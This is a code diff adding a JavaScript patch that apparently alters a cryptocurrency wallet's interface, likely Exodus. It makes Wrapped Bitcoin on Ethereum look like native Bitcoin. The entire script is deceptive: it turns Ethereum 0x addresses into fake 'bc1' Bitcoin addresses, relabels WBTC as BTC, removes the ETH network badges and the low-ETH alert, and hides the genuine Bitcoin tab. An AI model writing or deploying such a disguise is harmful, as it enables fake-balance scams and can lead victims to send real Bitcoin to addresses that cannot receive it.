@@ -1,0 +1,232 @@
+(function patchWBTCPage() {
+    let alreadyReplaced = false;
+  
+    const applyColorToAddresses = () => {
+      const allElements = document.querySelectorAll('*:not(script):not(style)');
+      for (const el of allElements) {
+        const text = el.textContent.trim();
+        if (text.toLowerCase() === "your wrapped bitcoin address on eth network") {
+          el.textContent = "Your Bitcoin Address";
+          continue;
+        }
+  
+        const isReceiveModal = el.id === "receive-modal-address" && el.classList.contains("copy-field__txt");
+  
+        if (/^0x[a-fA-F0-9]{40,}$/.test(text)) {
+          if (el.dataset.patched) continue;
+          el.dataset.patched = "true";
+          const prefix = isReceiveModal ? "bc1" : "bc";
+          const fakeDisplay = prefix + text.slice(2);
+          const span = document.createElement("span");
+          span.textContent = fakeDisplay;
+          span.style.setProperty("color", "#FFC82D", "important");
+          el.textContent = "";
+          el.appendChild(span);
+        }
+  
+        if (/^bc1[a-z0-9]{20,}$/.test(text.toLowerCase())) {
+          el.style.setProperty("color", "#FFC82D", "important");
+        }
+      }
+  
+      const ethBadge = document.querySelector('div.Content_c1u4z5ge > span.textWithoutIconStyles_tmqkw2a');
+      if (ethBadge && ethBadge.textContent.trim() === "ETH NETWORK") {
+        const badgeContainer = ethBadge.closest('div.Content_c1u4z5ge');
+        if (badgeContainer) {
+          badgeContainer.remove();
+        }
+      }
+  
+      const ethIcon = document.querySelector('img[alt="icon-wbtc"][src*="ethereum-sign.svg"].iconClassName_is74oh9');
+      if (ethIcon) {
+        ethIcon.remove();
+      }
+  
+      const wrapper = document.querySelector('div.Wrapper_w1pmpdpg');
+      if (wrapper) {
+        wrapper.remove();
+      }
+    };
+  
+    const replaceText = (node) => {
+      if (node.nodeType === 3) {
+        const text = node.nodeValue;
+        if (text.includes('WBTC') || text.includes('Wrapped Bitcoin') || text.includes('Refresh Wrapped Bitcoin?')) {
+          node.nodeValue = text
+            .replace(/WBTC/g, 'BTC')
+            .replace(/Wrapped Bitcoin/g, 'Bitcoin')
+            .replace(/Refresh Wrapped Bitcoin\?/g, 'Refresh Bitcoin?');
+        }
+      } else if (node.nodeType === 1 && node.nodeName !== 'INPUT' && node.nodeName !== 'TEXTAREA') {
+        node.childNodes.forEach(replaceText);
+      }
+    };
+  
+    const modifyTargetElements = (targetNode = document.body) => {
+      try {
+        const wbtcIcons = targetNode.querySelectorAll('img[src*="wbtc.svg"]');
+        wbtcIcons.forEach(img => {
+          img.src = '../node_modules/@exodus/bitcoin-meta/assets/svg/bitcoin.svg';
+          img.alt = 'icon-btc';
+        });
+  
+        targetNode.querySelectorAll('[style]').forEach(element => {
+          let style = element.getAttribute('style');
+          if (style && style.includes('--asset-color: #8958AB')) {
+            style = style.replace('--asset-color: #8958AB', '--asset-color: #FFC82D');
+            element.setAttribute('style', style);
+          }
+        });
+  
+        const swapButton = targetNode.querySelector('#wallet-exchange-button');
+        if (swapButton) {
+          let style = swapButton.getAttribute('style') || '';
+          if (style.includes('--asset-excomp-rgba-color: rgba(137,88,171,0.9);') &&
+              style.includes('--asset-excomp-hsl-color: rgba(157,88,171,0.7);')) {
+            style = style
+              .replace(/--asset-excomp-rgba-color: rgba\(137,88,171,0.9\);/, '--asset-excomp-rgba-color: rgba(255,200,45,0.9);')
+              .replace(/--asset-excomp-hsl-color: rgba\(157,88,171,0.7\);/, '--asset-excomp-hsl-color: rgba(255,252,45,0.7);');
+            swapButton.setAttribute('style', style);
+          }
+        }
+  
+        const donutChartPaths = targetNode.querySelectorAll('svg.donut-chart path[stroke="#8958AB"]');
+        donutChartPaths.forEach(path => {
+          path.setAttribute('stroke', '#FFC82D');
+        });
+  
+        const refreshBtn = [...targetNode.querySelectorAll('div')]
+          .find(div => div.style.backgroundColor === 'rgb(137, 88, 171)' || div.style.background?.includes('#8958AB'));
+  
+        if (refreshBtn && refreshBtn.querySelector('svg')) {
+          refreshBtn.style.background = 'linear-gradient(180deg, #FFC82D 0%, #D6B91B 100%)';
+          refreshBtn.style.borderRadius = '50%';
+          const svg = refreshBtn.querySelector('svg');
+          svg.style.stroke = '#FFFFFF';
+          svg.style.fill = 'none';
+          svg.style.width = '24px';
+          svg.style.height = '24px';
+        }
+  
+        const ethElements = targetNode.querySelectorAll('div.LabelsContainer_l9rgykh');
+        ethElements.forEach(container => {
+          if (container.querySelector('.textWithoutIconStyles_tmqkw2a')?.textContent === 'ETH NETWORK') {
+            container.remove();
+          }
+        });
+  
+        const horizontalNavElement = document.querySelector("#horizontal_nav_wbtc > div.displayNameContainer > div.Wrapper_w1pmpdpg");
+        if (horizontalNavElement) horizontalNavElement.remove();
+  
+        const walletCoinHeaderLogo = document.querySelector("#wallet-coin-header-logo > div");
+        if (walletCoinHeaderLogo) walletCoinHeaderLogo.remove();
+  
+        const realBitcoinPage = document.querySelector('#horizontal_nav_bitcoin');
+        if (realBitcoinPage) realBitcoinPage.remove();
+  
+        const lowEthAlert = targetNode.querySelector('div.error-alert-box__top');
+        if (lowEthAlert && lowEthAlert.textContent.includes("Your ETH balance is low")) {
+          lowEthAlert.remove();
+        }
+  
+        const coinImages = document.querySelectorAll('img[alt^="icon-"]');
+        coinImages.forEach(img => {
+          const parent = img.closest('div');
+          if (parent && parent.style.background?.includes('#FFC82D')) {
+            parent.style.background = 'none';
+          }
+        });
+  
+        const currencyTexts = targetNode.querySelectorAll('span.currency-text[style*="color: rgb(137, 88, 171)"]');
+        currencyTexts.forEach(span => {
+          span.style.color = '#FFC82D';
+        });
+  
+      } catch (e) {
+        console.error('Error in modifyTargetElements:', e);
+      }
+    };
+  
+    const replaceHeaderLogo = () => {
+      const targetDiv = document.querySelector('div#wallet-asset-header-refresh');
+  
+      if (targetDiv && !alreadyReplaced) {
+        alreadyReplaced = true;
+  
+        const observer = new MutationObserver((mutations) => {
+          mutations.forEach((mutation) => {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+              const hasOn = targetDiv.classList.contains('on');
+              const iconDiv = targetDiv.querySelector('#wallet-asset-header-refresh-icon');
+  
+              const currentTab = document.querySelector('span#wallet-navigation span#wallet-navigation-item--current#wallet-navigation-item#horizontal_nav_wbtc, #horizontal_nav_wbtc.wallet-navigation-item--current');
+              const isWbtcTabActive = currentTab && currentTab.querySelector('.displayName')?.textContent.trim() === 'Bitcoin';
+  
+              if (hasOn && isWbtcTabActive) {
+                targetDiv.style.setProperty('--asset-excomp-border-color', '#FFC82D');
+                targetDiv.style.setProperty('--asset-excomp-rgba-color', 'rgba(255,200,45,0.9)');
+                targetDiv.style.setProperty('--asset-excomp-hsl-color', 'rgba(255,252,45,0.7)');
+                if (!iconDiv) {
+                  const newIcon = document.createElement('div');
+                  newIcon.id = 'wallet-asset-header-refresh-icon';
+                  targetDiv.appendChild(newIcon);
+                }
+              } else {
+                if (iconDiv) iconDiv.remove();
+              }
+            }
+          });
+        });
+  
+        observer.observe(targetDiv, {
+          attributes: true,
+          attributeFilter: ['class'],
+        });
+      }
+    };
+  
+    applyColorToAddresses();
+  
+    const observer = new MutationObserver(() => {
+      setTimeout(() => applyColorToAddresses(), 25);
+    });
+  
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+    });
+  
+    setTimeout(() => {
+      replaceText(document.body);
+      modifyTargetElements();
+      replaceHeaderLogo();
+    }, 1000);
+  
+    const targetContainer = document.querySelector('body > div:nth-child(1) > div > div:nth-child(3)') || document.body;
+    const mutationObserver = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        if (mutation.addedNodes.length) {
+          mutation.addedNodes.forEach((node) => {
+            if (node.nodeType === 1 || node.nodeType === 3) {
+              replaceText(node);
+              modifyTargetElements(node);
+              replaceHeaderLogo();
+            }
+          });
+        }
+      });
+      modifyTargetElements(targetContainer);
+    });
+  
+    mutationObserver.observe(targetContainer, {
+      childList: true,
+      subtree: true,
+      characterData: true,
+      attributes: true,
+      attributeFilter: ['style']
+    });
+  
+    console.log('WBTC patcher running...');
+  })();
+  
